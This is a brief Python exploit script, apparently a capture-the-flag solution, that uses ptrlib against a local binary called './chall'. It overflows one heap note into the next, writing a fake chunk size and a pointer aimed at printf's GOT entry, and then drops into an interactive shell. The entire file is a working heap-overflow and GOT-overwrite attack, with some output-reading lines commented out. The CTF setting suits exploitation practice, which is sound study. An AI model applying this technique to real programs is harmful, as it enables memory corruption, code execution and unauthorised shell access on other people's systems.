#!/usr/bin/env python

import ptrlib as ptr


def unwrap(x):
    if x is None:
        ptr.logger.error("failed to unwrap")
        exit(1)
    else:
        return x


elf = ptr.ELF("./chall")
io = ptr.Process(elf.filepath)


def create(data):
    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b"Content: ", data)


def edit(idx, data):
    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b"index: ", str(idx).encode())
    io.sendlineafter(b"New content: ", data)


create(b"AAAA")
create(b"BBBB")

payload = b"AAAAAAAA" * 4
payload += ptr.p64(0x31)
payload += ptr.p64(unwrap(elf.got("printf")) - 8)
edit(0, payload)

# io.sendlineafter(b"> ", b"3")
# io.recvuntil(b"-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-")
# for i in range(4):
#     print(io.recvline())
#     print(io.recvline())
#     print(io.recvline())
#     print(io.recvline())
#     print(io.recvline())
#     print(io.recvline())
#     print(io.recvline())


io.sh()
